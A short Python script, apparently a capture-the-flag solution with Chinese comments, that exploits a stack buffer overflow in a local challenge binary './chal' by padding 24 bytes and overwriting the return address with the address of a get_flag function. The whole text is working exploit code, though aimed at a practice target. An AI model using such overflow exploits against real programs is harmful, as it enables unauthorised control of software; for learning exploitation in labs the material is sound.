import subprocess, struct

TARGET = "./chal"     # 程序名，记得带 ./
OFFSET =24        # 从 buf 到返回地址，多少字节
WIN  =0x4011b6         # get_flag 的地址，0x 开头

payload = b"A" * OFFSET + struct.pack("<Q", WIN)
print("payload =", payload.hex())

r = subprocess.run([TARGET], input=payload, capture_output=True)
print(r.stdout.decode(errors="replace"))
print("returncode =", r.returncode)
